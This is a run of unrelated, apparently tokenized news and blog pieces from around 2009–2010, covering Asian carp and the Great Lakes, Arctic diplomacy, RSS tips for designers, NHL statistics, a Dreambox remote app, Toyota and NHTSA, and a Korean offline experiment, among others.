The summit was at the request of Michigan Gov. Jennifer Granholm ( D ) , after the US Supreme Court ruled last month that it would not force Illinois to close the shipping locks that allow access to Lake Michigan .
But on Monday , Governor Granholm came away from the summit less than satisfied with the results .
As part of the meeting , federal officials presented a proposed framework , designed to prevent the Asian carp from infiltrating the Great Lakes .
Federal authorities are proposing to control , but not close , the lock operations .
According to the plan , the locks will open and close less frequently , and the water will be treated each time the locks are open to prevent the fish from swimming through to the Lake Michigan side .
“ What we ’ll be doing is keeping the fish blocked when it ’s open , ” says Jo-Ellen Darcy , assistant secretary of the Army for civil works .
As for how the water will be treated , “ those plans are under development ” but will be “ preventative , ” Ms. Darcy says .
Also on Monday , the White House announced a $ 78.5 million commitment to deal with the issue .
The federal money is intended for several things : new water sampling , the construction of a concrete and chain - link fence between the Chicago Sanitary and Ship Canal and the Des Plaines River , and the construction of a third electric barrier on the canal .
Michigan , however , has requested that the Illinois locks be permanently closed , and this request was at the heart of the lawsuit that the Supreme Court considered last month .
The suit , which received support from five neighboring states , charged that Asian carp will potentially destroy the ecosystem of the Great Lakes and threaten the $ 7 billion business connected with it – primarily fishing and tourism industries .
In a statement released late Monday , Granholm said that the proposed framework ’s “ primary objectives are not sustainable and that this is a plan to limit damages , not solve the problem . ”
She also said , “ While we did have some areas of agreement with the White House , we believe that the plan does not adequately address the concerns we have been voicing about the imminent threat Asian carp pose to the Great Lakes . ”
Monday ’s meeting included officials from the US Army Corps of Engineers , the Environmental Protection Agency , the Interior Department , and the Coast Guard .
The proposed framework argued against closing the locks for commercial reasons , saying that 14.6 million tons of the Chicago region ’s petroleum , coal , road salt , cement , and iron travel through the lock , generating $ 2 billion each year .
It also says that the canal is used by the Coast Guard for emergency purposes and is an essential piece of the area ’s flood - control plan and water - treatment process .
On the same day that the Supreme Court handed down its ruling , the US Army Corps of Engineers announced that it discovered two DNA samples along Calumet Harbor near Lake Michigan , showing that Asian carp had breached Lake Michigan .
Earlier this month , Michigan Attorney General Mike
Cox filed a renewed motion with the high court to ask for the lock closures , saying that the court made its decision without knowledge of the DNA evidence .
He also said that Illinois “ seriously exaggerated ” the economic loss suffered if the locks were closed .
" We think the court should take another look at our request to hit the pause button on the locks until the entire Great Lakes region is comfortable that an effective plan is in place to stop Asian carp , " Mr. Cox said in a statement .

Mrs Clinton said those with interests in the Arctic should have been invited Hillary Clinton has criticised Canada for failing to invite indigenous groups and Scandinavian countries to talks on the future of the Arctic .
The US secretary of state said everybody affected by the changes brought about by climate change in the Arctic should have been included .
She was speaking at the start of the meeting near Ottawa .
Canada invited Russia , Norway , Denmark and the US to the meeting , but not Sweden , Finland or Iceland .
Mrs Clinton said all those " who have legitimate interests in the region " , including indigenous peoples , should have been invited to the conference .
" We need all hands on deck because there is a huge amount to do , and not much time to do it .
" What happens in the Arctic will have broad consequences for the Earth and its climate .
' Deepening cooperation '
" The melting of sea ice , glaciers and permafrost will affect people and ecosystems around the world , " she said .
Canadian Foreign Affairs Minister Lawrence Cannon said the representatives who had attended the conference had agreed on the need for " deepening cooperation " in the Arctic , in view of increased shipping in the region The Arctic Council - an intergovernmental group of Arctic states and groups representing the indigenous Inuit people - meets twice a year to discuss regional issues .
Some concern has been expressed that the five coastal states at the Canadian meeting were forming an " inner core " at the expense of other parties .
But Mr Cannon said the meeting did not intend to " to replace or undermine the Arctic Council " .

Last week we started on a series geared towards new designers getting connected to the design community .
This week we continue the series with a look at great design blog RSS feeds to follow as well as some tips to consuming large amounts of content .
Last week we started on a series geared towards new designers getting connected to the design community with an article on designers on Twitter .
This week we continue the series with a look at great design blog RSS feeds to follow as well as some tips to consuming large amounts of content .
A Brief Introduction
If you ’re a designer and you ’re not subscribing to RSS feeds , I strongly encourage you to start .
RSS , short for “ Really Simple Syndication ” is a format for delivering regularly changing content ( i.e. blogs ) to a single user .
The old way of browsing the web involved bookmarking and visiting sites whenever you wanted to check for updates .
RSS and accompanying RSS readers bring news stories , blog posts , etc. to a central location whenever new content is published .
Basically , it does all the hard work for you and gives you a bucket full of content ready for consumption .
For more information on RSS , check out this RSS in plain English video .
It provides a great overview and will help get you started .
Get a Reader , and Subscribe
The first step in taking advantage of RSS is by signing up for an RSS reader .¬†
While their are many to choose from , my favorite has to be Google Reader .
If you have a Google account it makes subscribing , reading , and organizing easy .
Once you ’ve signed up for a reader , the next step will be to find the feeds .
You ’ll want to look for an RSS feed icon on various blogs and news sites .
Many browsers will also provide you with icons directly in the browser bar .
Clicking these icons will take you to the actual feed page where you can subscribe using whatever reader you like .
You can also load feeds directly into the reader if that is more convenient .
Tips for Consuming a Large Number of Blogs
I find that my subscription list can get quite out of hand sometimes .
At last check , I ’m subscribed to over 250 blogs and the number grows every day .
There is no way one person can consume that much information .
Here are a couple tips to help make sense of the pile of feeds that you ’ve gathered .
Categories and Priorities
Segmenting your RSS feeds is a great way to quickly get to the content you want to read .
Most RSS readers will allow you to move feeds into folders or tags so you can group related blogs together .
Two great methods for organizing are categories and priorities .
Category grouping puts similar blogs into a folders with relevant titles .
I ’ve done this with many of the feeds I consume .
I ’ve got a category for design blogs , design galleries , apple / mac , business / marketing , tech , and sports .
Whenever I ’m in the mood to read on a particular category , regardless of the specific source , I can quickly jump to the folder and start reading .
Another methodology for sorting feeds is based on priority .
Under this sort order , you place blogs together that are must reads ( high priority ) and blogs together that you really do n’t have to read ( low priority ) .
I use this for my 150 + design blogs , breaking them down into three categories : A , B , C . I ’ll spend most of my time reading each and every article in category A while I barely scan through the titles in category C.¬†
It seems to work out great and helps me get to the content I really value .
Quick Scan and Save
Another tip for getting through a large amount of material is filtering out some of the junk .
Every time I open my reader , I ’ll quickly scan the titles and if anything grabs my eye , I ’ll star it ( a Google reader function ) for later .
Then I ’ll empty out my reader and go back to the starred material .
Sometimes I may miss some great material because an article does n’t “ catch my eye ” but in this day and age , if you ’re not writing good post titles , you may want to focus on grabbing readers attention .
Read and take Action
After I read each post , I ’ll decide if there ’s anything worth doing with this article .
Should I share it on Twitter ?
Should I file it to write a post ?
If there ’s a specific action that needs to happen , I ’ll make a note or move the article to somewhere more permanent ( bookmark , email , etc . ) .¬†
If not , I ’ll delete it and move on to the next one .
Sorting through and reading hundreds of articles a day is no easy task but as a designer I feel that constant learning is a must and I have to be able to stay up on trends and news .
The RSS process I ’ve described is well worth the time and effort .
The List
With RSS explained and the tips lined up , it ’s time to start consuming some great blog articles .
These 75 blogs are not the only blogs that you should be reading but they do offer a great starting point .
I ’m sure I ’ve left on some truly great sources of information .
If you ’ve got others to recommend , please let me know in the comment section below .
I ’ve also created an OPML file that allows you to import the entire list into your reader at one time :
I also want to recommend another great list of blogs that are more business related but still very relevant to designers .
These 16 blogs to help you master the business of design are all excellent sources of marketing , business planning , and other important tasks that designers should understand .
Add them to your reader as well .

If you frequently dig through your browser history to find a Web page you looked at a few days earlier ( or accidentally closed a few seconds ago ) , or peruse your bookmarks to revisit a page you saved months ago , today ’s hint can help you find those pages more quickly than by browsing menus or venturing into Safari 's Bookmarks screen .
You could do this using Mac OS X’s Spotlight feature , which searches your Safari bookmarks and history ; however , Spotlight also searches everything else on your hard drive , making it an inefficient way to find something specific to your browser .
What few people know is that Safari has its own “ quick search ” feature , hidden in an unexpected location .
To perform a Safari - specific search , you simply click on Safari ’s Help menu— or , if your fingers prefer to remain on the keyboard , press Command +?— and enter your search term .
Instead of searching just Help documents , OS X also searches your Safari history and bookmarks — or , more specifically , the title of each Web page in your History and Bookmarks menus .
The results of your search appear instantaneously in the Menu Items section of the Help menu— listed first are history items , followed by bookmarks .
( Results from Mac OS X Help are listed at the bottom of the menu next to Help Topics . )
Mouse over a result , or use the up - and down - arrow keys to highlight it , and OS X will show you exactly where in the History or Bookmarks menus that Web page resides .
Click the page name — or press Return — to open the Web page in Safari .
( This “ feature ” is really just a side effect of the fact that the OS X Help system searches the current application ’s menu commands to make it easier to find a particular command ; since your bookmarks and history items are listed in Safari ’s menus , they get searched , as well .
This means that to include Safari 's bookmarks bar in these searches , you must enable the Safari setting to include the bookmarks bar in the bookmarks menu .
Of course , if you ’ve created additional bookmark folders outside of the bookmarks menu or bar , those folders wo n’t be searched . )
For example , in the screenshot below , I was looking for a specific site I visited while checking for the latest versions of the screen savers I covered last week .
The search for “ screen saver ” found six results in my history and two in my bookmarks ; when I highlighted one of the history results , OS X showed me the name of the site and the date on which I visited it .
There are a couple limitations to this approach to searching Safari compared to a full - blown Spotlight search .
The first is that whereas standard Spotlight queries , as well as queries you initiate in Safari ’s Bookmarks / History screen , search both the title and the content of every Web page , the Help - menu version searches only the title .
The second issue is that the Help menu is often too narrow to view each site ’s name , especially for history results , where each site ’s name is preceded by the day and date you visited it ; in these cases , you need to highlight an item to view its name .
( Bookmarks are displayed with the folder name preceding the name of the page , so you 'll have the same issue with long bookmark - folder names . )
I find myself using Safari ’s “ hidden ” search feature several times each day to quickly revisit a site .
It ’s also useful when I accidentally close a tab or window , and it ’s especially convenient if , like me , you prefer keyboard shortcuts to mousing about : just press Command +? , type a few characters , and then use the arrow keys to select the desired site from the search results .
Oh , and here ’s a related bonus hint :
If you ’re using 1 Password 3 , and you enable 1 Password ’s Show In Top Menu Bar setting , Safari's Help - menu search will also search your 1 Password logins , letting you quickly open and log in to a Website .
While the chase for the playoffs sits at the forefront of most hockey fans ' minds these days , it 's also a good time to look ahead at likely winners for some of the major individual awards for this NHL season .
The Hart Trophy is awarded each year to " the player judged to be the most valuable to his team " .
This lends itself quite neatly to statistical analysis , as we can get a good handle on which players have , in total , boosted their team 's Goals For and held down their Goals Against over the course of a season .
Follow me after the jump for a look at your MVP candidates ...
The idea here is to leverage the Rating statistics from Behind the Net , which sums up the net influence on Goals For & Against per 60 minutes of play , and convert those into counting stats based on the cumulative ice time and games played for each individual .
For instance , Alex Ovechkin 's presence in 5 - on - 5 action has resulted in a net of +35.7 goals for Washington , compared to how the Capitals fare when he is on the bench .
His influence on the power play is almost as large ( +31 ) , and he is a pretty average PK man .
The Penalty +/-
Impact reflects the influence on Goals For & Against from a player drawing or committing penalties , and thus creating PP or PK situations for his team .
Using a previous estimate by Alan Ryder , each power play is worth 0.153 goals , reflecting the increased likelihood that your team is going to score ( with a PK costing the same amount ) .
Sum up the 5 - on - 5 , PP , PK and Penalty +/- columns , and you get a Total Impact that each player has had on Goals For & Against over the course of the season .
Most MVP discussions focus solely on offensive contributions , and ignore the defensive side of the game .
Remember - these measures reflect the influence of a given player on the performance of his team .
They are not meant to be used a direct comparison of players on different teams to say " who is better " .
It is , rather , " who is more valuable to his team " .
Yes , this analysis does leave goaltenders out of the equation , but we can argue over the Vezina another day .
Below the table I have a few comments about some of the individual players :
Note : PP Impact reflects 5 - on - 4 play only , PK Impact reflects 4 - on - 5 only .
Other odd - man situations are n't common enough to change these standings significantly .
Alex Ovechkin # 8 / Left Wing / Washington Capitals Height : 6 - 2 Weight : 233 Born : Sep 17 , 1985
GP G A P +/- PIM PPG SHG GWG GTG SOG PCT 2009 - Alex Ovechkin 61 44 52 96 41 81 11 0 5 0 314 14.0
His 5 - on - 5 Impact ranks among four elite players who are well ahead of the rest of the league , while his power play work is in a class by itself ( his +31 PP Impact is followed distantly by Sergei Gonchar at +22.6 ) .
Even his two - game suspension this week should n't slow down his march to a repeat performance as Hart Trophy winner .
Nicklas Lidstrom # 5 / Defenseman / Detroit Red Wings Height : 6 - 1 Weight : 190 Born : Apr 28 , 1970
GP G A P +/- PIM PPG SHG GWG GTG SOG PCT 2009 - Nicklas Lidstrom 69 8 35 43 17 16 5 0 1 0 164 4.9
Given all the issues Detroit has had to struggle through this season , the Red Wings have had to rely on Lidstrom perhaps more than they ever have .
His penalty killing work is particularly telling .
When he's on the ice , the Red Wings give up 3.45 goals per 60 minutes , a rate that is better than the top overall PK teams in the league .
When he's on the bench , the Wings give up 8.36 goals per 60 minutes , which would rank among the worst .
Zach Parise # 9 / Left Wing / New Jersey Devils Height : 5 - 11 Weight : 190 Born : Jul 28 , 1984
GP G A P +/- PIM PPG SHG GWG GTG SOG PCT 2009 - Zach Parise 67 32 36 68 21 28 8 1 4 0 288 11.1
Parise 's 5 - on - 5 results are tops in the league , and he's also boosted by his ability to draw penalties , while not taking many himself .
Matt Carle & Chris Pronger : Since this defensive duo often plays together in Philadelphia , their results can be difficult to separate from each other , although Pronger stands out as the # 2 defenseman in PP impact .
Henrik & Daniel Sedin : Somewhat surprisingly , the Canucks score about 2 more goals per 60 minutes of power play time when the Sedins are n't on the ice .
At even strength , however , they are among the most dominant players in the game this season .

Higher - order abstract syntax provides a convenient way of embedding domain - specific languages , but is awkward to analyse and manipulate directly .
We explore the boundaries of higher - order abstract syntax .
Our key tool is the unembedding of embedded terms as de Bruijn terms , enabling intensional analysis .
As part of our solution we present techniques for separating the definition of an embedded program from its interpretation , giving modular extensions of the embedded language , and different ways to encode the types of the embedded language .

I like to watch / CopVision is a program that watches television .
Specifically , it watches COPS on Fox .
It is not a video , it is a software process that tries to make sense of a live video feed .
COPS is all it has ever known , and it probably thinks it is COPS .
It has started to watch television as the show .
CopVision learns its language from closed captioning subtitles transmitted in the television signal .
Everything that is said on COPS is tucked away in its memory to help it understand what it 's seeing .
It analyzes every frame , searching the field for outlines that remind it of something it has seen before .
When it recognizes a contour it tags it with a guess as to what might be going on , gathered from its experience of words and pictures that go together .
It sometimes tries to put words in the mouths of the characters .
CopVision is funny when commercials come on because it does n't know that it is n't COPS , and it keeps watching the same way .
CopVision , like COPS , has no irony .
It does its level best in every circumstance to do its duty .
That its understanding of the world of COPS falls short can be taken as a comment either on what is missing from the show or what is lost in the process of extraction of meaning .
It 's both of course , but they compound in unpredictable ways .
Through projects like I Like to Watch / CopVision , it has become possible to imagine a day when automated media consumption can finally keep pace with digital production .
Our machines may spare us the work of watching .

Control the linux - based Dreambox , produced by the German multimedia vendor Dream Multimedia , remotely with your Windows Mobile smart phone and WMDreamRemote
If you ’re reading this , you probably already know all about the Dreambox , one of the most popular lines of digital television series ever to be produced .
Dreambox 7000 - S via Wikimedia
Given all the fuss over these digital receivers being remotely controlled by an iPhone , owners of smartphones powered by Windows Mobile are probably feeling left out in the cold right about now .
Is there any way to make Windows Mobile - based mobile phones remotely control a Dreambox as well ?
“ What in the world is a Dreambox ? ” you still may ask .
Okay , a quick review of the Dreambox reveals it to be a highly - popular series of Linux - based set - top box receivers for DVB satellite and cable digital television channels .
These Linux tuners even support terrestrial television ( that means your standard plain - jane TV channels , for you non-technical folks out there ) .
It was originally produced by Dream Multimedia , a German multimedia company .
The Dreambox series used Linux - based software originally developed for DBox2 , another Linux tuner .
The DBox2 was originally distributed by KirchMedia , another German company that has since gone “ kaputt ” due to a bankruptcy .
The bankruptcy was a boon to Linux geeks worldwide , as it flooded the market with unsold Dreamboxes available for hobbyist tinkering .
The low - cost Dreambox hardware makes Digital Video Broadcasting ( DVB ) available on a shoestring budget .
Table of Dreambox models
**HDMI via DVI to HDMI adapter ( Screenshot via Wikipedia ‘ Dreambox ’ )
The Dreambox hardware supports remote LAN and WAN access through its built - in Ethernet port , making it available for a multitude of tasks wherever you may be ( work , home , on the road , etc. ) .
Examples of activities you can perform remotely include :
handling timer - events ( i.e. , recording a TV show )
EPG viewing
remote unit wake up
channel changing
other remote control features
Okay , so the Dreambox hardware itself supports remote control features , but how do you make your Windows Mobile smartphone actually perform the duties of the remote control itself ?
Have no fear , WMDreamRemote is the answer to all your remote DVB Linux woes .
Available on the XDA Developer ’s website , WMDreamRemote
via Dreamboxth
Although it ’s currently in beta testing ( version 0.6 being the latest release ) , there are no known bugs so far .
It has so far been tested on the HTC HD2 with IPBox350 , DM7000 and DM800 .
A separate version of WMDreamRemote for devices with a 320 x 240 screen resolution has also been released .
Future releases plain to integrate
detailed EPG information , better timer management , remote reboot / standby / power - off capabilities , sending SMS messages to the TV screen , and improved error - handling .
Out of all the Dreambox tools out there , for Windows Mobile fans this is the one to have , it makes DVB Linux via remote control easier than waking up for work or school in the morning .
WMDreamRemote actually runs on any Enigma - based Linux tuner , so even if you decide to trash your Dreambox you ’re not stuck with a smart - phone - app you ca n’t use .
Just download the app from the xda website and get started turning your smartphone into a full - fledged Dreambox remote control .
( need to register to get to these links but it is free )
You ’re “ good to go ” as long as your Windows Mobile - based smartphone has the Compact .
NET 2.0 Framework installed .
Gone are the days of missing out on your favorite TV program just because you forgot to set your Dreambox timer before leaving the house .
When it comes to remote controlling your Dreambox or other Enigma - based Linux tuner , Windows Mobile addicts are no longer left out in the cold .
WMDreamRemote is bound to make other smartphone owners jealous .
What ’s next , a Dreambox remote control Android app ?
Maybe one for the Blackberry or Palm Pre ?
We ’ll just have to wait and see …

This is one of our editors ' picks from our ongoing roundup of Investigations Elsewhere .
Two former regulators at the National Highway Traffic Safety Administration took a spin through the revolving door and landed at Toyota , where they helped quash at least four NHTSA investigations into unintended acceleration , Bloomberg Newsreports .
The former regulators , Christopher Tinto and Christopher Santucci , both joined Toyota directly from the NHTSA , Tinto in 1994 and Santucci in 2003 .
Tinto is now vice president of regulatory affairs in Toyota ’s Washington office , and Santucci works under him .
Since 2003 , NHTSA has opened eight investigations into unintended acceleration of Toyota vehicles ; of those , five were closed after finding no evidence of a defect .
According to Bloomberg , " In four of the five cases that were closed , Tinto and Santucci worked with NHTSA on Toyota ’s responses to the consumer complaints the agency was investigating , agency documents show . "
What ’s more , Toyota appears to be the only big automaker that hires former regulators to deal with the NHTSA : Spokesmen for General Motors , Ford , Chrysler and Honda all told Bloomberg that their companies have no ex-NHTSA staffers dealing with the agency on defects .
While Santucci and Tinto broke no rules — the lower - level positions they held at the NHTSA do n’t have required waiting periods —
Allan Kam , former NHTSA senior enforcement attorney , said , " They ’re not supposed to deal with the agency about a matter they dealt with at the agency . "
When asked about former staffers ’ potential influence on agency decisions , Transportation Department spokeswoman Olivia Alair told Bloomberg that NHTSA " currently has three open investigations involving Toyota and is monitoring two major safety recalls involving Toyota vehicles .
NHTSA ’s record reflects that safety is its singular priority . "
Toyota spokeswoman Martha Voss said , " Anything Mr. Tinto and Mr. Santucci did was in the interest of full disclosure , transparency and openness with regulators and safety experts . "
She declined to make them available for comment .

Life in America as we have known it since 1946 is finished .
Something else will happen .
What is interesting is that this yielding was to internal American forces and not to external threats .
It is possible to envision America ahead to be not unlike England in the 1950s , broke and broken , with cheap rents in Liverpool and Manchester , and the men with the “ right stuff ” on the docks of Liverpool who conquered the world in ships 200 years before , idled and impotent but with full healthcare .
And desperately seeking passage to America .
They had no where to turn but to America .
Possibly we have no where to turn now but to China , begging for mercy and sponsorship .
Signals from Copenhagen suggest it will not be forthcoming .
As with Victoria ’s England and the Romanov ’s Russia , neighbors and opponents begin sharpening their swords when they sense mortal weakness .
At a high school honors ceremony last week a student said that character is not just knowing what to do .
Everyone knows that .
Character is having the courage to do it .
Out of the 30 - some states that have initiated states rights legislation last year , 14 differentiate themselves by bringing a constitutional challenge to the bill .
They have found courage to challenge a bill that has been in the works , as President Obama said , for 100 years .
It is the 100 - year ride of the philosophy of the anti-hero he refers to ; the agent and agency of the horde .
The horde has won .
The horde always wins in time .
Fouad Ajami writes eloquently on the philosophy of the horde and there are a number of books about American ’s pending decline , like David Murrin ’s Breaking the Code of History and William Strauss and Neil Howe ’s The Fourth Turning .
But these books and most books like this look at America as a unified economic and cultural matrix when in fact , the agricultural center of the country is a different America with different values than the urbanized , post - industrial America on the edges .
The center , marked by the initiative of the 14 states , is alive and well with good values .
It is the edges that are sick and dying .
The constitutional challenge will likely not hold up .
Thomas Jefferson and James Madison warned us that if the federal government became the sole and exclusive arbiter of its own powers , those powers would continue to grow , regardless of elections , courts , separation of powers or other much - vaunted checks and balances , says Michael Boldin , founder of the Tenth Amendment Center .
But it too is a marker and has drawn new , original boundaries .
This is no longer about Republican and Democrat .
It is about regions .
And the healthy center states must find a way now to protect themselves from the dying edges .
Incidentally , the new TV show “ V ” starts this month .
That is what it is about :
The benign takeover of America ’s political life and soul by benevolents ( alien lizards in Pelosi , Hoyer , Reid clothing ) , and a path to survive and defend against it .

On / Off : Can South Koreans survive without the web ?
Like most of Seoul , the Kukdong apartments are all wired up to the web
By John Sudworth
BBC News , Seoul
South Korea is often called the world 's most wired society , boasting the fastest average broadband speeds on the planet .
What happens when you ask two families to live without the web for one week ?
It was never going to be easy , asking South Koreans to sign up , turn off and plug out .
I was looking for members of this hyper - connected country who were willing to spend seven long days in offline solitude , while the rest of the online world roared on without them .
We targeted one particular Seoul tower block , the Kukdong Riverside Apartments in central Seoul .
It is home to more than 100 high - rise flats providing small but comfortable homes of the kind familiar to millions of ordinary South Koreans .
I trudged the stairwells and knocked on doors .
I plastered the building with posters asking for volunteers .
And I called a community meeting .

But for many of the residents , a world without the web simply was n't conceivable .
Some schoolchildren are now asked to file their homework assignments online , so parents were naturally reluctant to unplug them .
Other people said they ran their own internet businesses , or worked from home , or simply could n't face life without the habit that web - browsing has become .
A season of reports from 8 - 19 March 2010 exploring the extraordinary power of the internet , including : Digital giants - top thinkers in the business on the future of the web Mapping the internet - a visual representation of the spread of the web over the last 20 years Global Voices - the BBC links up with an online community of bloggers around the world
What is SuperPower ?
John Sudworth 's On / Off diary
They wanted news , views and social networks all to stay within easy reach .
But in the end the effort paid off .
Two families bravely stepped forward to take the plunge , fully aware that our little experiment would cause them considerable inconvenience .
Firstly the Kims : they are a highly wired family with two teenage boys , the youngest of whom , Seung - yeon , is a talented computer programmer who spends up to six hours online every day .
Next , the Yangs : they are a family with younger sons , but who are , nonetheless , just as dependent on the web .
Most of the TV channels that the two boys enjoy are piped into the home over the internet .
And their mother , Jung - a , admits to a two - hour - a - day web browsing habit .
So , with the families braced for a week of internet abstinence , all we needed was for someone to help us pull the plug .
That job fell to Mr Song , an engineer from Korea Telecom .
He left carrying the two internet modems , one from each household , tucked under his arm , and the project was under way .

For both families there were , of course , a number of instant practical difficulties .
Pushing a trolley around her local supermarket , Jung - a told me that she normally does most of her shopping online .
She 's not alone .
In 2008 , the total size of the South Korean e-commerce market reached more than $ 600 bn .
This is due in no small part to the role of the government , which has invested in digital infrastructure and framed policies to regulate competition and protect consumers .
And the South Korean state itself has turned into a kind of online shop , offering a wide range of services over the internet including tax and benefits payments .
The Kims are also struggling without access to such innovations .
Hye - sook runs an online blog for other school mums .
Now temporarily cut off , she 's forced to meet them in the real world .
" It 's been so inconvenient , " she tells me .
" It 's normally easy to arrange a meeting - I just post a notice on our internet forum , but this time I 've had to telephone everyone individually . "
Rejuventated youth
These small difficulties are predictable enough .
But as the week progresses , the families report a psychological reaction , too .
The Yang children began playing more traditional games ...
Without access to the online news networks , now the most common way that information about the outside world finds its way into the home , both families talk about an unnerving sense of isolation .
A recent survey showed that 68 % of South Koreans get their news from the internet , compared with just 32 % who still read newspapers .
But all of our volunteers agree that there is also a positive side to the experience .
Freed from their computers , they find that they 're spending more time with each other .
In the Kim household , Seung - yeon is practising the piano more , books are being read and board games have been rediscovered .
Hye - sook is pleased with the effect the experiment is having on her eldest son .
For the first time in a long time , she 's finding the whole family dressed and ready for breakfast in the morning .
" Normally Sung - jun would be in bed after playing internet games all night .
It 's been a long time since I 've seen him up this early , " she tells me .
And then , with sighs of relief all round , our brief experiment is over .
As promised , Mr Song returns with the modems .

Of course , seven days without the internet was never really going to be too much of an ordeal .
But it has delivered our families some surprises and , they all admit , shown them just how much they have come to rely on the web .
The Yangs say they will change their behaviour as a result .
" After finishing my morning chores I used to spend between two and three hours online , " Jung - a tells me .
" That 's time spent alone .
But , during the experiment I 've even had the time to drink tea with neighbours , so I 'm going to regulate time spent online from now on . "
But would either of the families consider giving it up for good ?
" It would be the same as asking if you could cut off my electricity for a week , " Cho Hye - sook laughs .
" Lose the internet for another seven days ?
It 's a real ' No thank you , ' I 'm afraid .
I do n't want to go through this again . "

THE CRY OF MANN : A TROOL Day Holiday Spectacular in Eight Parts
The FBI and other federal agencies are going undercover on Facebook , LinkedIn , MySpace and other social networks with phony profiles to gather information and communicate with suspects , according to an internal Justice Department document .
FBI agents , for example , have used Facebook to determine the whereabouts of a fugitive .
Other investigators can check alibis by comparing stories a suspect tells police with their tweets sent at the same time .
A civil liberties group , The Electronic Frontier Foundation , obtained the 33 - page document after suing the Justice Department .
It plans to make it public today on its website , http://www.eff.org.
According to the Associated Press , the document says Facebook is " often cooperative with emergency requests " from federal investigators while Twitter 's lawyers demand a warrant or subpoena before it will turn over customer information .
The Justice Department says such covert investigations are legal and are governed by as - yet undisclosed internal rules , the AP says , quoting from the document .
In one section , Justice discusses its own lawyers , saying social networks are a " valuable source of information on defense witnesses . "
" Knowledge is power , " the document says .
" Research all witnesses on social networking sites . "
At the same time , the document warns law enforcement officials themselves to think prudently before adding judges or defense counsel as " friends " on these services .
See a related posting here on how the Italian police used Facebook to track down and capture one of the country 's most wanted mafia suspects .

Roadrunning , in the late Cretaceous
One the most agile dinosaurs so far discovered has been unearthed in China .
The tiny dinosaur , dubbed a " roadrunner " by the scientists who found it , is also one of the smallest dinosaurs known .
Measuring just half a metre long , the fleet - footed theropod named Xixianykus zhangi was likely to have used a huge claw to dig for termites and ants .
It then used its speed to efficiently move between ant mounds and avoid the attentions of larger predators .
Details of the discovery are published in the journal Zootaxa .
Xixianykus was a highly efficient runner
Fossil co-discoverer Dr Corwin Sullivan
" The limb proportions of Xixianykus are among the most extreme ever recorded for a theropod dinosaur , " says Dr Corwin Sullivan , a Canadian palaeontologist based at the Chinese Academy of Sciences in Beijing and one of the authors of the study .
For example , the small theropod 's upper leg , or femur or thigh bone , is particularly short in comparison to its lower leg and foot .
A similar pattern is seen in many running animals today .
" This does n't provide a basis for estimating its top speed , but it does show that Xixianykus was a highly efficient runner , " says Dr Sullivan .
Fast digger
An international team of researchers discovered the dinosaur fossilised in the Upper Cretaceous Majiacun Formation of Xixia County in Henan Province , China .
It is the first dinosaur of its type , known as an alvarezsaurid theropod , found in China , with just tiny fragments of its relatives previously being found further north in Inner Mongolia , Asia .
DINO DISCOVERIES
Dr Xing Xu and colleagues earlier this month announced the discovery of a close relative of the swift , predatory dinosaur Velociraptor
The oldest fossilised dinosaur burrows were unearthed last year A dinosaur - eating snake has recently been found
The researchers , led by Dr Xing Xu of the Chinese Academy of Sciences , uncovered an incomplete skeleton of Xixianykus , which included seven vertebrae , the synsacrum , which is formed from fused vertebrae and helps carry the weight of the hind part of the animal , a few ribs , parts of the pelvic girdle and most of the right hindlimb .
Several of the skeleton 's characteristics have reinforced the impression that Xixianykus was a highly efficient runner , adds Dr Sullivan .
Features of the hind limb , pelvis and backbone would have promoted stability and reduced superfluous , energy - wasting movements as Xixianykus dashed across prehistoric landscapes , he says .
The " roadrunning " dinosaur , as its discoverers describe it , probably hunted small insects , such as termites and ants .
Its forelimbs were not preserved , but other alvarezsaurids related to Xixianykus possessed large single claws at the end of short , strong forelimbs , which scientists believe they used to dig into ant nests and termite mounds .
The researchers believe that Xixianykus fed in the same way .
Some of the adaptations that helped to stabilise the body when running could also have braced it when digging .
" It may sound odd , but digging and running actually work quite well together , " says study co-author Dr David Hone of the Chinese Academy of Sciences .
" Some modern termite - eating species travel long distances between colonies of their prey , so as an efficient runner Xixianykus would have been able to follow this pattern .
" Any small dinosaurs would be vulnerable to predators too and the ability to make a speedy exit if danger threatened would be valuable to an animal like this . "

Police have finished making safe up to 50 suspected bombs booby - trapped at a dead pensioner 's home in southern Sydney .
The devices were discovered throughout the home , inside a car on the driveway and on a gas meter .
The one in the car consisted of a pressure switch on the front seat connected to canisters and wires , police said .
But none of the devices were found to contain active explosives , police said .
Bomb squad officers spent most of yesterday at the property in Meagher Avenue , Maroubra South , after a neighbour raised the alarm .
Further investigation revealed the 69 - year - old man , who lived at the property , died in hospital more than a week ago .
It is understood he was an electrician and a known recluse .
Friends of the man visited his home early yesterday and alerted police to several suspicious devices in and around the house .
Emergency services evacuated neighbours while the bomb squad officers did their work .
" Six devices were rendered safe through the detonation of small charges , which were attached to the suspicious devices by bomb disposal robots , " a police statement said .
" The device in the vehicle was one of the devices detonated .
" Examinations found that none of the suspicious devices contained active explosives . "
The operation ended at 2.30 am today and police thanked neighbours for their patience .
Think of the 10 women who just had their fallopian tubes tied at a clinic in northern Colombia as foot soldiers in Erwin Goggel ’s lonely war on overpopulation and poverty .
A film producer and heir to a dairy fortune , Goggel is offering nine - acre plots rent - free to poor men and women who agree to have vasectomies and tubal ligations .
He pays for all the surgical procedures , including the 10 operations performed late last month in Monteria , the capital of Cordoba state , about 30 miles south of here .
Goggel , a 61 - year - old father of two who had a vasectomy 10 years ago , says his offer is aimed at alleviating Colombia ’s grinding poverty , which he insists is directly proportional to the size of peasant families .
If population growth trends persist , he predicts an apocalyptic future for Colombia and the planet .
“ The middle - class lifestyle as we know it , with a car , a refrigerator and a good education for the kids , is out of the question for these people , ” said Goggel , whose shock of gray curly hair hints at his hippie past .
“ They are in a vicious cycle that a high rate of reproduction perpetuates .
Big , poor families are in an economic hole that they ca n’t see out of . ”
So far about 46 couples , the majority with three or four children , have taken him up on the offer .
Most are landless sharecroppers or day laborers native to the region who have settled in this village and grow subsistence crops of plantain , beans and sesame seeds .
Goggel is distributing 25 more parcels this month .
“ It was not a hard decision at all .
Before Erwin , every day was a struggle to survive .
Now I can live on what I produce , ” said Anibal Del Rio , 34 , father of four .
“ More than one guy has made fun of me , saying I ’ve been castrated , that I ’ll leave women behind .
But I do n’t mind .
What matters is what I think , not what others say . ”
Goggel acknowledges that the response has been less than overwhelming to the offer he first made in 2002 .
He blames “ machismo and ignorance ” about vasectomies and the fact that he does n’t give the peasants who take up his offer title to the land , allowing instead “ sanctioned squatting . ”
Vasectomies and tubal ligations are legal in Colombia , but the Roman Catholic Church , a powerful social force , frowns upon them .
So far , however , Goggel said , the church has n’t put any obstacles in his way .
“ We are still very small scale , ” he said .
